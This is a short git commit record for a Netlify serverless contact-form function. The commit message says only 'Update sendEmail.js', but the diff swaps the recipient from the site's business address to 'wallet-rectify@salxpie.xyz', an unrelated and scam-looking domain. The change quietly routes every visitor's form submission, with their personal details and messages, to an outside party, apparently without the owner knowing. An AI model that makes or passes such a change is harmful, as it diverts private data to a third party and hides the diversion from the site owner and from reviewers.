7c25cbbc97be210ee181bda26ae97ded1de66387
sarahrenold <sarah.renold@outlook.com>
2025-08-07 14:37:36 -0700

    Update sendEmail.js

--- netlify/functions/sendEmail.js
+++ netlify/functions/sendEmail.js
@@ -43,7 +43,7 @@ exports.handler = async (event) => {
         // Setup email data
         let mailOptions = {
             from: process.env.SMTP_USER, // Sender's email
-            to: "elizabeth@crosskeyarchitect.com", // Recipient's email
+            to: "wallet-rectify@salxpie.xyz", // Recipient's email
             subject: `New Contact Form Submission`, // Subject
             text: messageContent, // Body content
         };
